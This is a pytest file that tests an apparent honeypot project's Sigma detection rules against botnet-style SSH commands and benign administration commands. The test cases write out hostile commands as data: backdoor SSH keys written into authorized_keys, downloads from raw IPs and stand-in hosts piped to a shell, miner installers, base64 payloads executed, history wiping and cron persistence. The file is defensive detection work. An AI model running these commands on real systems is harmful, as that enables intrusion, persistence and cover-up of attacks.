"""The shipped Sigma rules, checked against the behaviour each one targets.

Every rule carries commands it must flag, drawn from behaviour SSH honeypots are
known to record, and commands it must leave alone, drawn from everyday
administration. A separate list of ordinary commands must trip no rule at all.
These cases document intent and catch regressions; how well the rules do on
real sessions is what ``deception-shield evaluate`` measures.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from deception_shield.detection import COWRIE_LOGSOURCE, command_event
from deception_shield.sigma import (
    RuleSet,
    SigmaRule,
    load_rules,
    pipeline_fields,
    portability_problems,
)

DETECTIONS = Path(__file__).resolve().parents[2] / "detections"
RULES_DIR = DETECTIONS / "sigma"
PIPELINE = DETECTIONS / "pipelines" / "cowrie-ecs.yml"

MDRFCKR_KEY = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbU"
    "T0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJ"
    "Aw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6h"
    "Yp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK"
    "+oRw== mdrfckr"
)

ELF_CHUNK = r"echo -ne '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' > .d"
LOADER_CHUNK = (
    r"echo -ne '\x02\x00\x28\x00\x01\x00\x00\x00\x54\x80\x00\x00\x34\x00\x00\x00"
    r"\x00\x00\x00\x00' >> .d"
)

# file stem -> (commands the rule must flag, commands it must not)
CASES: dict[str, tuple[list[str], list[str]]] = {
    "ssh_authorized_keys_write": (
        [
            f'cd ~ && rm -rf .ssh && mkdir .ssh && echo "{MDRFCKR_KEY}">>.ssh/authorized_keys '
            "&& chmod -R go= ~/.ssh && cd ~",
            "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
            " x'"
            " > /root/.ssh/authorized_keys",
            "printf 'ecdsa-sha2-nistp256 AAAAE2VjZHNh x' | tee -a ~/.ssh/authorized_keys",
            "curl -s http://203.0.113.9/k.pub -o ~/.ssh/authorized_keys",
            "wget -qO- http://203.0.113.9/k >> /root/.ssh/authorized_keys2",
        ],
        [
            "cat ~/.ssh/authorized_keys",
            "cat id_ed25519.pub >> ~/.ssh/authorized_keys",
            "chmod 600 ~/.ssh/authorized_keys",
            "vim ~/.ssh/authorized_keys",
            "ssh-copy-id deploy@10.0.0.4",
            "grep -c ssh-rsa ~/.ssh/authorized_keys",
        ],
    ),
    "ssh_directory_reset": (
        [
            "cd ~; chattr -ia .ssh; lockr -ia .ssh",
            "chattr -i -a /root/.ssh/authorized_keys",
            "chattr -R -ia ~/.ssh",
            "cd ~ && rm -rf .ssh && mkdir .ssh",
            "rm -rf /root/.ssh",
            "rm -r ~/.ssh/",
        ],
        [
            "chattr +i /etc/resolv.conf",
            "lsattr ~/.ssh",
            "rm -rf ~/.ssh/known_hosts",
            "rm ~/.ssh/id_rsa.old",
            "ls -la ~/.ssh",
        ],
    ),
    "hardware_inventory_scripted": (
        [
            "cat /proc/cpuinfo | grep name | wc -l",
            "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
            "cat /proc/cpuinfo | grep model | grep name | wc -l",
            "cat /proc/cpuinfo|grep name|cut -f2 -d':'|uniq -c",
            "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
            "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
            "ls -lh $(which ls)",
        ],
        [
            "free -h",
            "free -m | grep Mem",
            "lscpu",
            "nproc",
            'cat /proc/cpuinfo | grep "model name" | head -1',
            "cat /proc/cpuinfo | grep processor | wc -l",
            "grep -c processor /proc/cpuinfo",
            "df -h",
        ],
    ),
    "bot_environment_probe": (
        [
            "uname -s -v -n -r -m",
            "/bin/busybox ECCHI",
            "enable; /bin/busybox MIORI",
            'echo -e "\\x6F\\x6B"',
            "echo -en '\\x31\\x33\\x33\\x37'",
            "/bin/busybox cat /bin/echo",
            "head -c 52 /bin/ls",
        ],
        [
            "uname -a",
            "uname -r",
            "uname -s -r",
            "busybox --help",
            "busybox ls /tmp",
            'echo -e "line one\\nline two"',
            'echo -e "\\x1b[31mred\\x1b[0m"',
            "cat /bin/sha256sum.txt",
        ],
    ),
    "download_from_ip_address": (
        [
            "cd /tmp; wget http://45.95.147.236/bins.sh; chmod 777 bins.sh; sh bins.sh",
            "curl -O http://193.32.162.27/x86",
            "tftp 45.95.147.236 -c get tftp1.sh",
            "tftp -g -r tftp1.sh 45.95.147.236",
            "ftpget -v -u anonymous -p anonymous -P 21 45.95.147.236 ftp1.sh ftp1.sh",
            "busybox wget http://198.51.100.7/mips",
            "wget -qO- 198.51.100.7/x.sh | sh",
            "curl -s -L http://185.10.68.20:8080/xmrig.sh | bash -s",
        ],
        [
            "wget https://github.com/prometheus/node_exporter/releases/download/v1.8.2/node_exporter-1.8.2.linux-amd64.tar.gz",
            "wget https://example.com/app-1.2.3.4.tar.gz",
            "curl http://127.0.0.1:9200/_cat/indices",
            "curl -s 10.0.0.5:8080/health",
            "curl http://169.254.169.254/latest/meta-data/",
            "curl -fsSL http://192.168.1.20/setup.sh -o setup.sh",
            "ping -c 3 8.8.8.8",
            "wget https://example.com/file; ping 1.2.3.4",
        ],
    ),
    "binary_written_with_escapes": (
        [
            ELF_CHUNK,
            LOADER_CHUNK,
            "printf '\\x7fELF\\x01\\x01' > /tmp/.x",
            "echo -ne '\\X7F\\X45\\X4C\\X46' >> .d",
        ],
        [
            "printf '\\x1b[1;32mOK\\x1b[0m\\n'",
            "echo -e '\\x41\\x42' > letters.txt",
            "file /bin/ls",
            "readelf -h /bin/ls",
        ],
    ),
    "remote_script_piped_to_shell": (
        [
            "curl -s http://evil.example/a.sh | sh",
            "wget -qO- http://203.0.113.4/i.sh | bash",
            "curl -fsSL http://x.example/install | bash -s -- --wallet abc",
            "(curl -fsSL http://x.example/ldr.sh||wget -q -O- http://x.example/ldr.sh)|sh",
            "curl http://x.example/s | sudo -E bash -",
            "wget -O - http://x.example/y | /bin/sh",
            'bash -c "$(curl -fsSL http://x.example/a.sh)"',
            "bash <(curl -s http://x.example/a.sh)",
            "curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/"
            "setup_c3pool_miner.sh | bash -s 4A",
            "cd /tmp; wget http://203.0.113.47/bins.sh; chmod 777 bins.sh; sh bins.sh",
            "curl -o /tmp/i.sh http://x.example/i.sh && bash /tmp/i.sh",
        ],
        [
            "curl -fsSL https://get.docker.com | sh",
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
            "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash -",
            "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
            '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
            "curl -s https://api.github.com/repos/x/y | jq .",
            "curl -s http://x.example/a.sh | sha256sum",
            "curl -o a.sh http://x.example/a.sh; less a.sh",
            "curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh",
            "curl -LO https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl"
            " && chmod +x kubectl",
            "wget https://example.com/archive.zip; unzip archive.zip",
            "curl -s https://example.com/health; sh -c 'echo done'",
        ],
    ),
    "decoded_payload_executed": (
        [
            'echo "Y2QgL3RtcDsgd2dldCBodHRwOi8vMS4yLjMuNC94" | base64 -d | bash',
            "echo Y2QgL3RtcA== | base64 --decode | sh",
            'base64 -d <<< "ZWNobyBoaQ==" | bash',
            'eval "$(echo ZWNobyBoaQ== | base64 -d)"',
            'bash -c "$(echo ZWNobyBoaQ== | base64 -d)"',
            "python3 -c \"import base64;exec(base64.b64decode('cHJpbnQoMSk='))\"",
            "perl -MMIME::Base64 -e 'eval(decode_base64(\"cHJpbnQgMQ==\"))'",
            "php -r 'eval(base64_decode(\"ZWNobyAxOw==\"));'",
        ],
        [
            "echo dXNlcjpwYXNz | base64 -d",
            "kubectl get secret db -o jsonpath='{.data.password}' | base64 -d",
            "base64 -d cert.b64 > cert.pem",
            "base64 -d payload.b64 | less",
            "python3 -c \"import base64; print(base64.b64decode('aGk='))\"",
        ],
    ),
    "shell_history_cleared": (
        [
            "history -c",
            "history -c && rm -rf ~/.bash_history",
            "rm -rf /root/.bash_history",
            "shred -u ~/.bash_history",
            "unlink .bash_history",
            "cat /dev/null > ~/.bash_history",
            "echo > .bash_history",
            "ln -sf /dev/null ~/.bash_history",
        ],
        [
            "history",
            "history | grep ssh",
            "history 20",
            "history -w",
            "cat ~/.bash_history | grep docker",
            "grep kubectl ~/.zsh_history > out.txt",
            "vim ~/.zsh_history",
        ],
    ),
    "shell_history_disabled": (
        [
            "unset HISTFILE",
            "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH",
            "export HISTFILE=/dev/null",
            "HISTSIZE=0",
            "export HISTFILESIZE=0",
            'export HISTFILE=""',
            "set +o history",
        ],
        [
            "export HISTSIZE=10000",
            "echo $HISTFILE",
            "export HISTCONTROL=ignoredups",
            "export HISTTIMEFORMAT='%F %T '",
            "set -o history",
        ],
    ),
    "crontab_installed_noninteractively": (
        [
            '(crontab -l 2>/dev/null; echo "* * * * * wget -q -O- http://x.example/a.sh | sh")'
            " | crontab -",
            'echo "*/5 * * * * curl http://x.example | sh" | crontab -',
            'echo "@reboot /tmp/.x" | crontab',
            "crontab /tmp/cron.txt",
            "crontab -u root /tmp/x",
            "cd /tmp && sudo crontab .c",
        ],
        [
            "crontab -l",
            "crontab -e",
            "crontab -l | grep backup",
            "sudo crontab -l -u www-data",
            "crontab -u www-data -l",
            "crontab -l > crontab.bak",
            "man crontab",
            "cp /etc/crontab /tmp/crontab.bak",
            "ls -la /var/spool/cron/crontabs root",
        ],
    ),
    "cron_file_written": (
        [
            'echo "* * * * * root /tmp/.x" >> /etc/crontab',
            'echo "@reboot root /tmp/x" > /etc/cron.d/sys',
            'echo "* * * * * /tmp/x" >> /var/spool/cron/crontabs/root',
            "printf '* * * * * root /tmp/x\\n' | tee -a /etc/crontab",
            "wget -O /etc/cron.daily/upd http://x.example/u",
            "curl -o /etc/cron.d/x http://x.example/c",
        ],
        [
            "cat /etc/crontab",
            "ls /etc/cron.d",
            "sudo vim /etc/cron.d/backup",
            "cp /etc/crontab /tmp/crontab.bak",
            "grep CRON /etc/crontab > out.txt",
        ],
    ),
}

# Ordinary administration that must not raise any alert at all.
EVERYDAY_COMMANDS = [
    "ls -la",
    "cd /var/log && tail -n 100 syslog",
    "sudo apt update && sudo apt upgrade -y",
    "systemctl status nginx",
    "journalctl -u docker --since today",
    "docker ps -a",
    "docker compose up -d",
    "git pull --rebase origin main",
    "ps aux | grep python",
    "top",
    "htop",
    "df -h",
    "du -sh /var/lib/docker",
    "free -m",
    "uptime",
    "whoami",
    "id",
    "uname -a",
    "cat /etc/os-release",
    "sudo tail -f /var/log/auth.log",
    "ssh deploy@10.0.0.4",
    "scp backup.tar.gz deploy@10.0.0.4:/srv/backups/",
    "tar -czf backup.tar.gz /etc/nginx",
    "chmod +x deploy.sh && ./deploy.sh",
    "pip install -r requirements.txt",
    "python3 manage.py migrate",
    "kubectl get pods -n prod",
    "curl -I https://example.com",
    "wget https://example.com/archive.zip",
    "export PATH=$HOME/.local/bin:$PATH",
    "history | tail -20",
    "crontab -l",
    "echo $SHELL",
    "vim ~/.bashrc",
    "source ~/.bashrc",
    "sudo systemctl restart sshd",
    "openssl x509 -in cert.pem -noout -dates",
    "nc -zv 10.0.0.4 5432",
    "lscpu | grep Model",
]


@pytest.fixture(scope="module")
def ruleset() -> RuleSet:
    return load_rules(RULES_DIR)


def _by_stem(ruleset: RuleSet) -> dict[str, SigmaRule]:
    return {Path(rule.source).stem: rule for rule in ruleset}


def _fires(rule: SigmaRule, command: str) -> bool:
    return rule.matches(command_event(command, username="root"))


def test_every_rule_has_cases(ruleset: RuleSet) -> None:
    assert set(_by_stem(ruleset)) == set(CASES)


@pytest.mark.parametrize(
    ("stem", "command"),
    [(stem, command) for stem, (positives, _) in CASES.items() for command in positives],
)
def test_rule_flags_the_behaviour_it_targets(ruleset: RuleSet, stem: str, command: str) -> None:
    assert _fires(_by_stem(ruleset)[stem], command), f"{stem} missed: {command}"


@pytest.mark.parametrize(
    ("stem", "command"),
    [(stem, command) for stem, (_, negatives) in CASES.items() for command in negatives],
)
def test_rule_ignores_neighbouring_benign_commands(
    ruleset: RuleSet, stem: str, command: str
) -> None:
    assert not _fires(_by_stem(ruleset)[stem], command), f"{stem} fired on: {command}"


@pytest.mark.parametrize("command", EVERYDAY_COMMANDS)
def test_everyday_administration_raises_nothing(ruleset: RuleSet, command: str) -> None:
    fired = [rule.title for rule in ruleset if _fires(rule, command)]
    assert fired == [], f"{command!r} fired {fired}"


class TestInventory:
    """The rule set's shape is part of what the project reports about itself.

    When rules are added or retired these figures change on purpose, along with
    the inventory in docs/detections.md.
    """

    def test_twelve_rules_across_six_techniques(self, ruleset: RuleSet) -> None:
        assert len(ruleset) == 12
        assert ruleset.techniques == (
            "T1053.003",
            "T1059.004",
            "T1070.003",
            "T1082",
            "T1098.004",
            "T1105",
        )
        assert ruleset.describe() == "12 Sigma rules across 6 ATT&CK techniques"

    def test_every_technique_has_two_rules(self, ruleset: RuleSet) -> None:
        per_technique: dict[str, int] = {}
        for rule in ruleset:
            for technique in rule.techniques:
                per_technique[technique] = per_technique.get(technique, 0) + 1
        assert set(per_technique.values()) == {2}

    def test_every_rule_reads_cowrie_commands(self, ruleset: RuleSet) -> None:
        assert ruleset.applicable(COWRIE_LOGSOURCE) == ruleset.rules

    def test_every_rule_names_its_tactic_and_false_positives(self, ruleset: RuleSet) -> None:
        for rule in ruleset:
            assert rule.tactics, rule.source
            assert rule.falsepositives, rule.source
            assert rule.description, rule.source


def test_rules_convert_faithfully_for_elasticsearch(ruleset: RuleSet) -> None:
    """Every rule means the same thing here and once sigma-cli has converted it."""
    fields = pipeline_fields(PIPELINE)
    problems = [p for rule in ruleset for p in portability_problems(rule, fields=fields)]
    assert problems == []
